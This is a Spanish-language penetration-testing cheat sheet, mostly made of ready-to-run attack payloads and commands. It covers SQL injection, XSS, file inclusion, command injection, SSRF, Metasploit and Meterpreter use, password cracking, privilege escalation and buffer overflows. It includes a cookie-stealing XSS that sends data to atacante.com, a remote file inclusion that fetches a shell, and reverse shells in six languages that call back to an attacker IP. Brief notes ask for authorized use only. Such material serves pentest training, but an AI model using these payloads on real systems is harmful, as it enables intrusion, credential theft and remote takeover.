---
title: "Tecnicas de Explotacion"
tags:
  - hacking
  - ofensivo
  - explotacion
  - hacking-ofensivo
tipo: hacking-ofensivo
certificacion: hacking-vault
---

# Tecnicas de Explotacion

La explotacion es la fase donde se aprovechan las vulnerabilidades descubiertas para obtener acceso no autorizado a sistemas. Requiere comprender tanto las vulnerabilidades como las herramientas y tecnicas disponibles para explotarlas.

> **Nota de seguridad:** Explotar vulnerabilidades sin autorizacion escrita es ilegal. Estas tecnicas deben practicarse exclusivamente en entornos de laboratorio (CTFs, maquinas virtuales) o durante pruebas de penetracion formalmente autorizadas con un acuerdo de alcance firmado.

## Vulnerabilidades Web - OWASP Top 10

### SQL Injection (SQLi)

La inyeccion SQL permite manipular consultas a bases de datos a traves de entradas no sanitizadas.

```sql
-- Deteccion basica: introducir en campos de entrada
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
" OR "1"="1" --
admin' --

-- Union-based SQLi: determinar numero de columnas
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    (incrementar hasta obtener error)

-- Extraer datos con UNION
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT username,password,3 FROM users-- -

-- Extraer version de la base de datos
' UNION SELECT @@version,2,3-- -        -- MySQL/MSSQL
' UNION SELECT version(),2,3-- -        -- PostgreSQL

-- Extraer tablas (MySQL)
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -

-- Extraer columnas
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Blind SQLi (basada en booleanos)
' AND 1=1-- -    (respuesta verdadera)
' AND 1=2-- -    (respuesta falsa)
' AND SUBSTRING(username,1,1)='a' FROM users-- -

-- Time-based Blind SQLi
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
```

**Automatizacion con sqlmap:**

```bash
# Deteccion automatica
sqlmap -u "http://10.10.10.1/page?id=1"

# Especificar parametro vulnerable
sqlmap -u "http://10.10.10.1/page?id=1" -p id

# Enumerar bases de datos
sqlmap -u "http://10.10.10.1/page?id=1" --dbs

# Enumerar tablas de una base de datos
sqlmap -u "http://10.10.10.1/page?id=1" -D basedatos --tables

# Volcar datos de una tabla
sqlmap -u "http://10.10.10.1/page?id=1" -D basedatos -T usuarios --dump

# Inyeccion en formulario POST
sqlmap -u "http://10.10.10.1/login" --data="user=admin&pass=test" -p pass

# Usar cookies de sesion
sqlmap -u "http://10.10.10.1/page?id=1" --cookie="PHPSESSID=abc123"

# Obtener shell del SO
sqlmap -u "http://10.10.10.1/page?id=1" --os-shell
```

### Cross-Site Scripting (XSS)

```html
<!-- XSS Reflejado: el payload se ejecuta desde la URL -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- XSS Almacenado: el payload se guarda en la base de datos -->
<!-- Se introduce en campos que se renderizan a otros usuarios -->
<script>document.location='http://atacante.com/steal?c='+document.cookie</script>

<!-- XSS DOM-based: manipulacion del DOM en el navegador -->
<script>document.write(location.hash.substring(1))</script>

<!-- Bypass de filtros comunes -->
<ScRiPt>alert('XSS')</ScRiPt>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
javascript:alert('XSS')
<svg/onload=alert('XSS')>
```

### Inclusion de Archivos (LFI/RFI)

```bash
# Local File Inclusion (LFI)
http://10.10.10.1/page?file=../../../../etc/passwd
http://10.10.10.1/page?file=....//....//....//etc/passwd
http://10.10.10.1/page?file=/etc/passwd%00           # Null byte (PHP < 5.3)

# Wrappers de PHP para LFI
http://10.10.10.1/page?file=php://filter/convert.base64-encode/resource=config.php
http://10.10.10.1/page?file=php://input              # POST data como codigo PHP
http://10.10.10.1/page?file=data://text/plain,<?php system('id'); ?>
http://10.10.10.1/page?file=expect://id              # Si el wrapper expect esta habilitado

# LFI a RCE via log poisoning
# 1. Inyectar PHP en el User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.10.10.1/
# 2. Incluir el log de Apache
http://10.10.10.1/page?file=/var/log/apache2/access.log&cmd=id

# Remote File Inclusion (RFI) - requiere allow_url_include=On
http://10.10.10.1/page?file=http://atacante.com/shell.php
http://10.10.10.1/page?file=http://atacante.com/shell.txt
```

### Command Injection

```bash
# Operadores de inyeccion de comandos
; ls                    # Secuencial
| ls                    # Pipe
|| ls                   # OR logico
& ls                    # Background
&& ls                   # AND logico
$(id)                   # Sustitucion de comando
`id`                    # Backticks

# Ejemplos de inyeccion
http://10.10.10.1/ping?ip=127.0.0.1;cat /etc/passwd
http://10.10.10.1/ping?ip=127.0.0.1|id
http://10.10.10.1/ping?ip=127.0.0.1$(whoami)

# Bypass de filtros de espacios
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

### SSRF (Server-Side Request Forgery)

```bash
# SSRF basico - acceder a servicios internos
http://10.10.10.1/fetch?url=http://127.0.0.1:8080/admin
http://10.10.10.1/fetch?url=http://localhost/server-status

# Acceder a metadatos de cloud (AWS)
http://10.10.10.1/fetch?url=http://169.254.169.254/latest/meta-data/

# Bypass de filtros
http://10.10.10.1/fetch?url=http://0x7f000001/        # IP en hexadecimal
http://10.10.10.1/fetch?url=http://2130706433/         # IP en decimal
http://10.10.10.1/fetch?url=http://[::1]/              # IPv6 localhost
http://10.10.10.1/fetch?url=http://127.1/              # Forma corta
```

### CSRF y File Upload Bypass

```html
<!-- CSRF - formulario automatico -->
<form action="http://victima.com/cambiar_email" method="POST" id="csrf">
  <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
```

```bash
# File upload bypass - tecnicas comunes
# Doble extension
shell.php.jpg

# Null byte en el nombre
shell.php%00.jpg

# Cambiar Content-Type
Content-Type: image/jpeg  (pero el archivo es PHP)

# Magic bytes - agregar cabecera de imagen
GIF89a;<?php system($_GET['cmd']); ?>

# Extension alternativa de PHP
shell.phtml, shell.php3, shell.php5, shell.phar, shell.phps
```

## Metasploit Framework

### Comandos Basicos

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
msf6> search eternalblue
msf6> search type:exploit platform:windows smb
msf6> search cve:2021-44228

# Seleccionar un modulo
msf6> use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones del modulo
msf6 exploit(ms17_010_eternalblue)> show options
msf6 exploit(ms17_010_eternalblue)> show advanced

# Configurar opciones
msf6 exploit(ms17_010_eternalblue)> set RHOSTS 10.10.10.1
msf6 exploit(ms17_010_eternalblue)> set LHOST 10.10.14.5
msf6 exploit(ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ejecutar el exploit
msf6 exploit(ms17_010_eternalblue)> exploit
msf6 exploit(ms17_010_eternalblue)> run

# Gestionar sesiones
msf6> sessions -l              # Listar sesiones activas
msf6> sessions -i 1            # Interactuar con sesion 1
msf6> sessions -k 1            # Cerrar sesion 1
```

### Meterpreter

```bash
# Comandos basicos de Meterpreter
meterpreter> sysinfo           # Informacion del sistema
meterpreter> getuid            # Usuario actual
meterpreter> getpid            # PID del proceso
meterpreter> ps                # Listar procesos
meterpreter> shell             # Abrir shell del sistema

# Navegacion del sistema de archivos
meterpreter> pwd               # Directorio actual
meterpreter> ls                # Listar archivos
meterpreter> cd C:\\Users      # Cambiar directorio
meterpreter> download file.txt # Descargar archivo
meterpreter> upload shell.exe  # Subir archivo
meterpreter> cat file.txt      # Leer archivo

# Post-explotacion en Meterpreter
meterpreter> hashdump          # Volcar hashes SAM
meterpreter> getsystem         # Intentar elevar a SYSTEM
meterpreter> migrate PID       # Migrar a otro proceso
meterpreter> keyscan_start     # Iniciar keylogger
meterpreter> keyscan_dump      # Volcar teclas capturadas
meterpreter> screenshot        # Captura de pantalla

# Pivoting con Meterpreter
meterpreter> run autoroute -s 172.16.0.0/24
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.0.5
```

## Searchsploit y ExploitDB

```bash
# Buscar exploits locales
searchsploit apache 2.4
searchsploit "wordpress 5.0"
searchsploit -t "privilege escalation" linux kernel

# Examinar un exploit
searchsploit -x 12345.py

# Copiar exploit al directorio actual
searchsploit -m 12345.py

# Buscar por CVE
searchsploit --cve 2021-44228

# Actualizar la base de datos
searchsploit -u
```

## Ataques de Password

### Hydra

```bash
# Fuerza bruta SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1

# Fuerza bruta FTP
hydra -L users.txt -P passwords.txt ftp://10.10.10.1

# Fuerza bruta formulario HTTP POST
hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Login failed"

# Fuerza bruta HTTP Basic Auth
hydra -l admin -P rockyou.txt 10.10.10.1 http-get /admin

# Fuerza bruta SMB
hydra -l administrator -P passwords.txt smb://10.10.10.1

# Fuerza bruta RDP
hydra -l admin -P passwords.txt rdp://10.10.10.1

# Opciones comunes
hydra -t 4 -f -V ...      # -t hilos, -f parar al encontrar, -V verbose
```

### John the Ripper

```bash
# Crackear hashes de /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crackear hash especifico
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt
john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt
john --format=bcrypt --wordlist=rockyou.txt hashes.txt

# Mostrar passwords crackeados
john --show hashes.txt

# Crackear archivos protegidos
zip2john archivo.zip > zip_hash.txt
john zip_hash.txt --wordlist=rockyou.txt

rar2john archivo.rar > rar_hash.txt
ssh2john id_rsa > ssh_hash.txt
keepass2john database.kdbx > keepass_hash.txt
```

### Hashcat

```bash
# Modos de hash comunes
hashcat -m 0 hash.txt rockyou.txt       # MD5
hashcat -m 100 hash.txt rockyou.txt     # SHA1
hashcat -m 1400 hash.txt rockyou.txt    # SHA256
hashcat -m 1000 hash.txt rockyou.txt    # NTLM
hashcat -m 1800 hash.txt rockyou.txt    # SHA-512 (Unix)
hashcat -m 3200 hash.txt rockyou.txt    # bcrypt
hashcat -m 500 hash.txt rockyou.txt     # MD5crypt (Unix)
hashcat -m 13100 hash.txt rockyou.txt   # Kerberoasting

# Ataque con reglas
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Ataque de mascara (fuerza bruta con patron)
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d    # 6 digitos
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?s # Patron especifico

# Verificar resultado
hashcat -m 0 hash.txt --show
```

## Reverse Shells

### Shells en Distintos Lenguajes

```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Netcat reverse shell
nc -e /bin/bash 10.10.14.5 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP reverse shell
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell reverse shell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Perl reverse shell
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Listener y Estabilizacion

```bash
# Listener con netcat
nc -lvnp 4444

# Listener con rlwrap (para mejor interaccion)
rlwrap nc -lvnp 4444

# Estabilizar shell con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (poner en background)
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
stty rows 40 cols 120
```

### Bind Shell vs Reverse Shell

| Caracteristica | Bind Shell | Reverse Shell |
|---------------|------------|---------------|
| Conexion | El atacante se conecta al objetivo | El objetivo se conecta al atacante |
| Comando objetivo | `nc -lvnp 4444 -e /bin/bash` | `nc 10.10.14.5 4444 -e /bin/bash` |
| Comando atacante | `nc 10.10.10.1 4444` | `nc -lvnp 4444` |
| Firewall | Bloqueado frecuentemente (puerto entrante) | Mas probable de funcionar (conexion saliente) |
| Uso tipico | Redes internas sin filtrado | Escenario por defecto en pentesting |

## Escalada de Privilegios

### Linux - Vectores Comunes

```bash
# Verificar permisos sudo
sudo -l

# Buscar archivos SUID
find / -perm -4000 -type f 2>/dev/null

# Buscar archivos SGID
find / -perm -2000 -type f 2>/dev/null

# Buscar capabilities
getcap -r / 2>/dev/null

# Verificar cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Buscar archivos con permisos de escritura
find / -writable -type f 2>/dev/null | grep -v proc

# Verificar version del kernel
uname -a
cat /etc/os-release

# Buscar passwords en archivos de configuracion
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

### GTFOBins

GTFOBins (https://gtfobins.github.io) documenta binarios de Unix que pueden usarse para escalar privilegios.

```bash
# Ejemplo: vim con sudo
sudo vim -c ':!/bin/bash'

# Ejemplo: find con SUID
find . -exec /bin/bash -p \;

# Ejemplo: python3 con sudo
sudo python3 -c 'import os; os.system("/bin/bash")'

# Ejemplo: nmap con sudo (versiones antiguas)
sudo nmap --interactive
!sh

# Ejemplo: awk con sudo
sudo awk 'BEGIN {system("/bin/bash")}'

# Ejemplo: less con sudo
sudo less /etc/passwd
!/bin/bash

# Ejemplo: cp para sobreescribir /etc/passwd
# Generar hash: openssl passwd -1 "password123"
# Crear linea: root2:HASH:0:0:root:/root:/bin/bash
# Copiar /etc/passwd, agregar linea, sobreescribir
```

## Buffer Overflow (Conceptos)

```
Estructura basica del stack:
+-------------------+
| Parametros        |  <- Argumentos de la funcion
+-------------------+
| Return Address    |  <- Direccion de retorno (EIP/RIP)
+-------------------+
| Saved EBP/RBP     |  <- Frame pointer guardado
+-------------------+
| Variables locales |  <- Buffer vulnerable
+-------------------+
| ...               |  <- Direccion baja de memoria
+-------------------+

Flujo de explotacion:
1. Encontrar el offset exacto (patron unico con msf-pattern_create)
2. Sobreescribir EIP/RIP con la direccion deseada
3. Insertar shellcode despues del return address
4. Usar NOP sled (\x90) para aterrizar en el shellcode
```

```bash
# Generar patron unico
msf-pattern_create -l 500

# Encontrar offset del patron
msf-pattern_offset -l 500 -q 41386141

# Generar shellcode con msfvenom
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00' -f python

# Estructura tipica del payload
# [BUFFER + PADDING] + [EIP -> JMP ESP] + [NOP SLED] + [SHELLCODE]
```

> **Nota de seguridad:** Las tecnicas de explotacion descritas aqui son extremadamente potentes y pueden causar danos irreparables si se usan de forma inadecuada. Practica siempre en entornos controlados y legales. Un pentester profesional actua dentro de los limites de la ley y del contrato firmado con el cliente.
